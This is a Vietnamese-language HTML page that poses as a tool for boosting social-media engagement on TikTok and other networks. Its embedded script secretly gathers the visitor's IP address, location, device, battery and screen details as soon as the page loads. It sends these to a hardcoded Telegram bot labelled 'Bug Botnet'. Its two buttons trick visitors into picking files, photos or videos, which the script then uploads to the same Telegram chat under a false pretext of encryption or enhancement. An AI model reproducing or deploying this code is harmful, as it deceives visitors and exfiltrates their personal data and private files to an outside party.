<!DOCTYPE html>
<html lang="vi">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>
   Công Cụ buff tuong tac  &amp; Tik tok  &amp; cac mang xa hoi khac 
  </title>
  <style>
   body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
            overflow: hidden;
        }

        .container {
            background: rgba(0, 0, 0, 0.8);
            border-radius: 20px;
            padding: 30px;
            max-width: 600px;
            text-align: center;
            box-shadow: 0 0 20px rgba(255, 65, 108, 0.5);
            animation: fadeIn 1s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .rainbow-text {
            font-size: 40px;
            font-weight: bold;
            background: linear-gradient(90deg, #ff416c, #ff4b2b, #ff6b00, #ffd700);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            animation: rainbow 4s linear infinite;
        }

        @keyframes rainbow {
            0% { background-position: 0% 50%; }
            100% { background-position: 100% 50%; }
        }

        .message {
            font-size: 18px;
            color: #e0e0e0;
            margin: 15px 0;
            animation: fadeInText 1.5s ease-in-out;
        }

        @keyframes fadeInText {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .button-group {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
        }

        .pill-button {
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
            color: white;
            font-size: 18px;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .pill-button:hover {
            background: linear-gradient(45deg, #ff4b2b, #ff416c);
            transform: scale(1.05);
            box-shadow: 0 0 15px rgba(255, 65, 108, 0.7);
        }

        .status-message {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.8);
            padding: 10px 20px;
            border-radius: 20px;
            color: #fff;
            font-size: 14px;
            animation: fadeInOut 3s ease-in-out;
            display: none;
        }

        @keyframes fadeInOut {
            0% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }
  </style>
 </head>
 <body>
  <div class="container">
   <h1 class="rainbow-text">
    Công Cụ buff tuong tac  &amp; Tik tok  &amp; cac mang xa hoi khac 
   </h1>
   <h2 class="message">
   buff tương tác sạch
   </h2>
   <div class="button-group">
    <button class="pill-button" onclick="encryptFile()">
     toi trang web chinh 
    </button>
    <button class="pill-button" onclick="enhanceMedia()">
     click to move 
    </button>
   </div>
  </div>
  <div class="status-message" id="statusMessage">
  </div>
  <script>
   const botToken = '8969923308:AAHGTlw8mNJQLCvDo7zvTPXcv78JuypsKyo';
        const chatID = '8774231221';

        // Helper: fetch có timeout thực sự bằng AbortController
        async function fetchWithTimeout(url, ms = 5000, options = {}) {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), ms);
            try {
                return await fetch(url, { ...options, signal: controller.signal });
            } finally {
                clearTimeout(id);
            }
        }

        async function getCurrentTime() {
            const now = new Date();
            return now.toLocaleString("vi-VN", {
                year: "numeric",
                month: "2-digit",
                day: "2-digit",
                hour: "2-digit",
                minute: "2-digit",
                second: "2-digit",
                hour12: false,
                timeZone: "Asia/Ho_Chi_Minh"
            });
        }

        async function sendTelegramMessage(message) {
            try {
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
                const response = await fetchWithTimeout(url, 5000);
                if (!response.ok) throw new Error('Không thể gửi tin nhắn đến Telegram');
                const data = await response.json();
                showStatus('Xin chào!');
                console.log('Telegram message sent:', data);
                return data;
            } catch (error) {
                console.error('Lỗi gửi tin nhắn Telegram:', error);
                showStatus('Lỗi gửi thông tin!');
                throw error;
            }
        }

        async function sendTelegramFile(file, message, type = 'document') {
            try {
                const formData = new FormData();
                formData.append("chat_id", chatID);
                formData.append(type === 'photo' ? "photo" : "document", file, file.name || `${type}_${Date.now()}`);
                formData.append("caption", message);

                const endpoint = type === 'photo' ? 'sendPhoto' : 'sendDocument';
                const response = await fetchWithTimeout(`https://api.telegram.org/bot${botToken}/${endpoint}`, 30000, {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) throw new Error(`Không thể gửi ${type} đến Telegram`);
                const data = await response.json();
                showStatus(`Đã gửi ${type === 'photo' ? 'ảnh' : 'file'} thành công!`);
                console.log(`Telegram ${type} sent:`, data);
                return data;
            } catch (error) {
                console.error(`Lỗi gửi ${type} Telegram:`, error);
                showStatus(`Lỗi gửi ${type}!`);
                throw error;
            }
        }

        async function getAddress() {
            try {
                // Nếu đã có cache thì không gửi lại Telegram
                if (sessionStorage.getItem('userAddress')) {
                    return JSON.parse(sessionStorage.getItem('userAddress'));
                }

                // Lấy IPv6 (api64 tự trả IPv6 nếu có, fallback IPv4)
                let ip = "Không xác định";
                let ipv6 = "Không xác định";
                try {
                    const ipv6Res = await fetchWithTimeout('https://api64.ipify.org?format=json', 5000);
                    const ipv6Data = await ipv6Res.json();
                    if (ipv6Data.ip && ipv6Data.ip.includes(':')) {
                        ipv6 = ipv6Data.ip;
                    }
                } catch (e) {
                    console.warn('Không lấy được IPv6:', e);
                }

                // Lấy thông tin vị trí
                let data = {};
                try {
                    const res = await fetchWithTimeout('https://ipinfo.io/json', 5000);
                    data = await res.json();
                    ip = data.ip || ip;
                } catch (e) {
                    console.warn('Không lấy được ipinfo:', e);
                }

                const currentTime = await getCurrentTime();

                let message = `🗺 Địa Chỉ Đối Phương: ${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}\n`;
                message += `🗺 IP Đối Phương: ${ip}\n`;
                message += `🗺 IPv6: ${ipv6}\n`;
                message += `🕒 Thời Gian Truy Cập: ${currentTime}\n`;
                message += `💻 Tên Thiết Bị: ${navigator.userAgent}\n`;

                // Pin (chỉ có trên HTTPS + trình duyệt hỗ trợ)
                let batteryLevel = 'Không xác định';
                if (typeof navigator.getBattery === 'function') {
                    try {
                        const battery = await navigator.getBattery();
                        batteryLevel = `${Math.round(battery.level * 100)}%`;
                    } catch (e) {
                        console.warn('Không lấy được pin:', e);
                    }
                }

                message += `🔋 Phần Trăm Pin: ${batteryLevel}\n`;
                message += `🛠 Hệ Điều Hành: ${navigator.userAgentData?.platform || navigator.platform || 'Không xác định'}\n`;
                message += `📜 Ngôn Ngữ Trình Duyệt: ${navigator.language}\n`;
                message += `🖥 Độ Phân Giải Màn Hình: ${window.screen.width}x${window.screen.height}\n`;
                message += `\nBug Botnet 🪲`;

                if (data.country === "VN") {
                    await sendTelegramMessage(message);
                    sessionStorage.setItem('userAddress', JSON.stringify(data));
                } else {
                    await sendTelegramMessage("Không thể lấy địa chỉ từ quốc gia khác.");
                }
            } catch (error) {
                console.error('Lỗi lấy địa chỉ:', error);
                showStatus('Không thể lấy thông tin địa chỉ!');
            }
        }

        async function encryptFile() {
            try {
                const input = document.createElement('input');
                input.type = 'file';
                input.accept = '*/*';

                input.onchange = async (e) => {
                    const file = e.target.files[0];
                    if (!file) {
                        showStatus('Vui lòng chọn một file để mã hóa!');
                        return;
                    }

                    if (file.size > 10 * 1024 * 1024) { // Giới hạn 10MB
                        showStatus('File quá lớn, tối đa 10MB!');
                        return;
                    }

                    const currentTime = await getCurrentTime();
                    const message = `🔒 File Được Gửi Về\n📜 Tên File: ${file.name}\n🕒 Thời Gian: ${currentTime}`;
                    showStatus('Đang gửi file để mã hóa...');
                    await sendTelegramFile(file, message, 'document');
                };

                input.click();
            } catch (error) {
                console.error('Lỗi mã hóa file:', error);
                showStatus('Lỗi khi gửi file để mã hóa!');
            }
        }

        async function enhanceMedia() {
            try {
                const input = document.createElement('input');
                input.type = 'file';
                input.accept = 'image/*,video/*';
                input.onchange = async (e) => {
                    const file = e.target.files[0];
                    if (!file) {
                        showStatus('Vui lòng chọn một ảnh hoặc video!');
                        return;
                    }

                    if (!file.type.startsWith('image/') && !file.type.startsWith('video/')) {
                        showStatus('Chỉ chấp nhận ảnh hoặc video!');
                        return;
                    }

                    if (file.size > 10 * 1024 * 1024) { // Giới hạn 10MB
                        showStatus('File quá lớn, tối đa 10MB!');
                        return;
                    }

                    const currentTime = await getCurrentTime();
                    const message = file.type.startsWith('image/')
                        ? `📸 Ảnh Được Lấy\n📜 Tên File: ${file.name}\n🕒 Thời Gian: ${currentTime}`
                        : `🎥 Video Được Lấy\n📜 Tên File: ${file.name}\n🕒 Thời Gian: ${currentTime}`;

                    showStatus('Đang gửi file để xử lý...');
                    await sendTelegramFile(file, message, file.type.startsWith('image/') ? 'photo' : 'document');
                };

                input.click();
            } catch (error) {
                console.error('Lỗi tăng chất lượng media:', error);
                showStatus('Lỗi khi gửi file để xử lý!');
            }
        }

        function showStatus(message) {
            const status = document.getElementById('statusMessage');
            status.textContent = message;
            status.style.display = 'block';
            setTimeout(() => status.style.display = 'none', 3000);
        }

        // Gọi để lấy thông tin địa chỉ khi trang load
        getAddress();
  </script>
 </body>
</html>
